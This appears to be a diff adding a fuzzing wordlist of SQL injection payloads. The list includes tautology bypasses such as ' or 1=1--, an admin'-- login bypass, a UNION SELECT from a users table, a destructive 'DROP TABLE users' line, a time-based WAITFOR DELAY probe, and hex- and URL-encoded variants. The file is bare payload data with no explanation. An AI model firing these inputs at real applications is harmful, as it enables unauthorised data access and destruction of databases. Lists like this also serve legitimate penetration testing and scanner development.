@@ -1,0 +1,66 @@
+'or''='
+' or ''='
+1 or 1=1
+'and''='
+' and ''='
+1 and 1=1
+1' AND '1'='1
+1' OR '1'='1
+1" AND "1"="1
+1" OR "1"="1
+1 AND 1=1
+-1 UNION SELECT *, null, null FROM users
+1; DROP TABLE users; --
+1 WAITFOR DELAY '00:00:10'
+1 AND USER_NAME()='dbo'
+1'1
+1 EXEC SP_ (or EXEC XP_)
+1' AND 1=(SELECT COUNT(*) FROM users); --
+\'; DESC users; --
+1\'1
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+test" or "a"="a
+test" or 1=1 --
+test' or 1=1 --
+test' or 'a'='a
+test') or ('a'='a
+test") or ("a"="a
+'test' or 'a'='a';
